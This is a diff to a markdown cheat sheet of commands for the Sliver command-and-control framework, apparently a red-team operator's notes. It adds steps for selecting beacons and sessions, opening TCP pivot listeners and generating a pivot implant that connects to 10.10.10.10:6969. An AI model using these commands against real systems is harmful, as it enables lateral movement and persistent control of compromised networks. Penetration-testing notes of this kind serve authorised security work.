@@ -173,14 +173,25 @@ sessions -i <sessionID>
 sock5 start
 // kill Proxy
 socks5 stop -i <id>
-//
-// Pivots
-// 
+
+
+```
+
+Pivots != `Portfwd`, egress through implants
+```go
+// List all an decide
+beacons
+// For each required hop 
+use $implant
+interactive
+// For implant that will be the pivot listener  
+use $session-id
 // Open a pivot port
 pivots tcp
-// Generate a Pivot Implant 
+// get details on a specific pivot listener; graph will display the json with more info
+pivots detail | pivot graph
+// Generate a Pivot Implant  that will connect to the pivot listener 
 generate --tcp-pivot 10.10.10.10:6969
-
 ```
 
 
